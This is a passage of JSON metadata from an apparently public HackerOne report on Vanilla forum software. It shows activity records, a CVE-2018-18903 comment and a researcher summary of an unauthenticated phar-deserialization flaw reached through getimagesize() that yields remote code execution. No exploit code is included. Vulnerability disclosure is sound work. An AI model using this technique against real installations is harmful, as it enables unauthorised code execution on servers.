db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3701313,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-23T15:46:58.122Z","updated_at":"2018-11-23T15:46:58.122Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3701345,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2018-18903","markdown_message":"\u003cp\u003eCVE-2018-18903\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-23T16:01:34.021Z","updated_at":"2018-11-23T16:01:34.021Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10567,"category":"researcher","content":"An **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAn \u003cstrong\u003eunauthenticated\u003c/strong\u003e attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\u003c/p\u003e\n"}]}